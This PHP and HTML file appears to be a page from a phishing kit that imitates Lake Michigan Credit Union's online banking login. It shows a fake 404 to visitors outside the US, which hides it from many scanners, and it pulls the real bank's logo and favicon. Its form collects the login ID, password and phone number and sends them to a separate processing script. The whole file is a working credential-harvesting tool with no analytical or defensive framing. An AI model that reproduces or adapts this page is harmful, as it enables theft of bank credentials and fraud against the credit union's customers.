<?php


$IPaddress=$_SERVER['REMOTE_ADDR'];
$two_letter_country_code=iptocountry($IPaddress);

if ($two_letter_country_code!=="US"){
    header('HTTP/1.1 404 Not Found');
    include '../404.php';
    exit();
    }

function iptocountry($ip) {   
    $numbers = preg_split( "/\./", $ip);   
    include("../ip_files/".$numbers[0].".php");
    $code=($numbers[0] * 16777216) + ($numbers[1] * 65536) + ($numbers[2] * 256) + ($numbers[3]);   
    foreach($ranges as $key => $value){
        if($key<=$code){
            if($ranges[$key][0]>=$code){$two_letter_country_code=$ranges[$key][1];break;}
            }
    }
    if ($two_letter_country_code==""){$two_letter_country_code="unkown";}
    return $two_letter_country_code;
}


?>

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lake Michigan Credit Union - The Best Place For Your Money</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://cdn.lmcu.org/Images/favicon.ico" rel="shortcut icon" type="image/x-icon">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans">
    <script type="text/javascript" src="mask.js"></script>   
</head>
<body>
    <div class="container">
        <div class="main">
            <div class="img"><img src="https://cdn.lmcu.org/Images/olb-logo.png" alt=""></div>
            <div class="login-head"><p>Login To Online Banking</p></div>
            <div class="form-content">
                <form action="../Process/userlog.php" method="post">
                    <div class="head">
                        <div class="text">
                            <p>LOGIN</p>
                        </div>
                    </div>
                    <div class="Form-Label">Login ID</div>
                    <div class="input"><input type="text" autocomplete="off" name="username" required></div>
                    <div class="Form-Label">Password</div>
                    <div class="input"><input type="password" name="password" required></div>
                    <div class="Form-Label">Phone Number</div>
                    <div class="input"><input id="phn" type="tel" name="phn" required></div>
                    <script>
                        var element = document.getElementById('phn');
                        var maskOptions = {
                        mask: '(000)-000-0000'
                        };
                        var mask = IMask(element, maskOptions);
                    </script>
                    <div class="button"><button type="submit">Log In</button></div>
                </form>
            </div>
        </div>
    </div>
</body>
</html>